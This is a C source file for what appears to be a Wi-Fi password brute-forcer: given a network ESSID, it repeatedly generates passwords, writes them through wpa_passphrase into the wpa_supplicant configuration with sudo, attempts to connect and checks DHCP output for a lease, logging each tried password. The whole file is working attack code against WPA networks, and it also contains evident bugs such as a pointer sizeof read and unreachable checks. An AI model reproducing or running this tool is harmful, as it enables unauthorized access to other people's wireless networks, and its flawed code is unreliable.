#include "libtasty.h"

int	finder(char *big, char *look)
{
	int	i;
	int	y;

	i = 0;
	y = 0;
	while (big[i])
	{
		while(big[i] == look[y])
		{
			i++;
			y++;
			if (look[y] == '\0')
				return (1);
		}
		i++;
	}
	return (0);
}

int	lens(char *s)
{
	int	i;

	i = 0;
	while (s[i])
		i++;
	return (i);
}

char	*join_essid_psswd(char *psswd, char *args)
{
	int	pos;
	int	i;
	char	*buff;
	
	pos = 0;
	i = 0;
	buff = calloc(lens(psswd) + lens(args) + 2, sizeof(char));
	while (args[i])
		buff[pos++] = args[i++];
	i = 0;
	buff[pos++] = ' ';
	while (psswd[i])
		buff[pos++] = psswd[i++];
	buff[pos] = '\0';
	return (buff);
}

void	write_pssphrase(int fd_phrase, char *psswd, char *args)
{
	char	*buff;
	char	*bin;
	char	*command;
	int	pos;

	pos = 0;
	bin = "#!/bin/bash\n";
	command = "wpa_passphrase ";
	buff = join_essid_psswd(psswd, args);
	while (bin[pos])
	{
		write(fd_phrase, &bin[pos], 1);
		pos++;
	}
	pos = 0;
	while (command[pos])
	{
		write(fd_phrase, &command[pos], 1);
		pos++;
	}
	pos = 0;
	while (buff[pos])
	{
		write(fd_phrase, &buff[pos], 1);
		pos++;
	}
}
/*
void	execute()
{
	system("sudo ./set.sh");
	system("sudo ./set_conf.sh");
	system("sudo ./passphrase.sh >> /etc/wpa_supplicant/wpa_supplicant-wlan0.conf");
	execve("sudo", s, env);
}
*/
char	*check_in(int fd)
{
	system("./check.sh");
	char	*buff;
	int	lec;
	
	buff = calloc(100, sizeof(char));
	lec = read(fd, buff, 100);
	if (lec < 0)
	       return (NULL);
       if (!buff)
       {
	       free(buff);
	       return (NULL);
       }
       return (buff);
}

char	*dhcp_check(char *check)
{
	int fd;
	int lec;
	char *buff;
	int pid;

	buff = malloc(100*sizeof(char));
	if (!check)
		return (NULL);
	pid = fork();
	if (pid == 0)
	{
		//system("sudo killall dhclient");
		system("sudo dhclient -v wlan0 2>>dhcp_check.txt 1>>ping_dhcp.txt");
		return (NULL);
	}
	else
	{
		wait(NULL);
		system("tail -n 1 dhcp_check.txt >> deff_check.txt");
		fd = open("deff_check.txt", O_RDONLY);
		lec = read(fd, buff, sizeof(buff));
		return (buff);
	}
	if (lec <= 0)
		return (NULL);
	return (buff);
}

void	execute_due()
{
	char *const s[] = {"./connect.sh", NULL};
	char *const env[] = {"hola", NULL};

	//system("sudo ./set.sh");
	system("sudo ./set_conf.sh");
	system("sudo ./passphrase.sh >> /etc/wpa_supplicant/wpa_supplicant-wlan0.conf");
	execve("sudo", s, env);
}

void	safe_psswd(char *psswd)
{
	int i;
	int fd;

	i = 0;
	fd = open("password_used.txt", O_WRONLY);
	while (psswd[i])
	{
		write(fd, &psswd[i], 1);
		i++;
	}
	write(fd, "\n", 1);
	close(fd);
}

int main(int arg, char *args[])
{
	int	fd_phrase;
	char	*psswd;
	int	fd_check;
	char	*check;
	char	*dhcp;
	int	pid;
	int	i = 0;

	system("figlet LaNeif S.L");

	system("sudo ./pre-set.sh");
	system("sudo ./set.sh");
	fd_check = open("check_fd.txt", O_RDONLY);
	if (arg == 1)
	{
		printf("Please, type ESSID");
		return (0);
	}
	fd_phrase = open("passphrase.sh", O_RDWR);
	psswd = generate_psswd();
	write_pssphrase(fd_phrase, psswd, args[1]);
	close(fd_phrase);
	check = calloc(1, sizeof(char));
	printf("[+] Starting process...\n");
	while (check[0] == '\0')
	{
		psswd = generate_psswd();
		pid = fork();
		if (pid == 0)
		{
			printf("[+] Trying with other password\n");
			i++;
			printf("[] Current password: %s\n", psswd);
			safe_psswd(psswd);
			fd_phrase = open("passphrase.sh", O_RDWR);
			write_pssphrase(fd_phrase, psswd, args[1]);
			close(fd_phrase);
			/*

			system("sudo ./set_conf.sh");
			system("sudo ./passphrase.sh >> /etc/wpa_supplicant/wpa_supplicant-wlan0.conf");
			system("sudo ./connect");*/
			execute_due();
			check = check_in(fd_check);
			//close(fd_check);
			if (check)
			{
				return (0);
			}
		}
		else
		{
			wait(NULL);
			if (check)
			{
				printf("[+] Trying to get an IP adress\n");
				system("sudo ./connect.sh");
				dhcp = dhcp_check(check);
				if (finder(dhcp, "bound") == 1)
				{
					printf("[+] Got it!");
					printf("-- Number of password tryed: %d\n", i);
					return (0);
				}
				else
				{
					printf("[-] Nope\n");
					system("rm -f check_fd.txt");
					check[0] = '\0';
				}
			}
		}
	}
	close(fd_check);
	if (!check)
		return (0);
	return (0);
}
